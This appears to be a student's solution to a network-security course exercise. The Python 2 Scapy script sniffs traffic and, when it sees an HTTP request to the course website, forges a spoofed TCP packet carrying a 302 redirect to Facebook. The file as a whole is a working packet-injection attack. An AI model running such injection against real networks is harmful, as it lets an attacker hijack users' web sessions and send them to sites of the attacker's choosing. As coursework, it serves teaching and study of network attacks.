import q1
import scapy.all as S
import socket

RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: http://www.facebook.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to Facebook by sending them the
    `RESPONSE` from above.
    """
   
    if(str(packet[S.TCP]).find("Host: infosec.cs.tau.ac.il") >-1):# and str(packet[S.TCP]).find(WEBSITE)>-1):
    #if(packet[S.IP].dst  == socket.gethostbyname(WEBSITE) or str(packet[S.TCP]).find("GET /2018/ HTTP/1.1") >-1 or str(packet[S.TCP]).find("GET /2018/login HTTP/1.1")>-1 or str(packet[S.TCP]).find("GET / HTTP/1.1")>-1):    

        tcp = packet[S.TCP]
        ip = packet[S.IP]
        p = S.IP(dst = ip.src ,src =  ip.dst)/S.TCP(dport = tcp.sport,\
            flags = "FA",sport =80  \
             ,seq = tcp.ack,ack =tcp.seq+len(packet[S.Raw]))/S.Raw(load =RESPONSE)
        
        S.send(p)

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!

    if '--help' in args or len(args) > 1:
        print 'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
